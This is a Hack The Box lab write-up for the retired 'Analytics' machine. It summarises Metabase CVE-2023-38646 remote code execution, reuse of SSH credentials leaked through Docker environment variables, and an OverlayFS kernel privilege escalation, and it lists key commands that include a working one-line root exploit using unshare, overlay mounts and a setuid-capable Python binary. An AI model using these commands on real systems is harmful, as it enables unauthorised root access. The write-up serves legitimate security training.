---
title: HTB Analytics
slug: analytics
lang: en
platform: Hack The Box
category: Container Escape and Kernel Privilege Escalation
headline: Metabase setup-token RCE, Docker environment credential leakage and OverlayFS escalation
difficulty: Retired
objective: Root / Administrator
date: 2026-05-07
tags: [Linux, Metabase, CVE-2023-38646, Docker, OverlayFS]
---

# HTB Analytics

## Executive Summary

Analytics exposes Metabase on a subdomain. The installed version is vulnerable to CVE-2023-38646, where the setup token can be abused to reach code execution through the setup validation endpoint.

## Initial Access

The exploit lands inside a Docker container as the Metabase user. Environment variables reveal reusable SSH credentials for the host.

## Privilege Escalation

Host enumeration identifies an Ubuntu Jammy kernel affected by OverlayFS privilege escalation issues. The final payload uses user namespaces, overlay mounts and a capability-enabled Python binary to spawn a root shell.

## Publishing Note

Recovered passwords are described but not repeated in full in the public Markdown source. Screenshots remain as evidence of the chain.

## Key Commands

```bash
curl http://data.analytical.htb/ | grep version
```

```bash
python3 exploit.py -u http://data.analytical.htb/ -c "id"
```

```bash
env
```

```bash
ssh metalytics@analytical.htb
```

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

## Evidence Trail

The following screenshots preserve the original lab evidence sequence from the Obsidian notes.

![[Pasted image 20260507182548.png|analytics evidence 01]]

![[Pasted image 20260507182748.png|analytics evidence 02]]

![[Pasted image 20260507183018.png|analytics evidence 03]]

![[Pasted image 20260507183715.png|analytics evidence 04]]

![[Pasted image 20260507183910.png|analytics evidence 05]]

![[Pasted image 20260507184107.png|analytics evidence 06]]

![[Pasted image 20260507184215.png|analytics evidence 07]]

![[Pasted image 20260507184240.png|analytics evidence 08]]

![[Pasted image 20260507184526.png|analytics evidence 09]]

![[Pasted image 20260507185208.png|analytics evidence 10]]

![[Pasted image 20260507190448.png|analytics evidence 11]]

![[Pasted image 20260507191450.png|analytics evidence 12]]
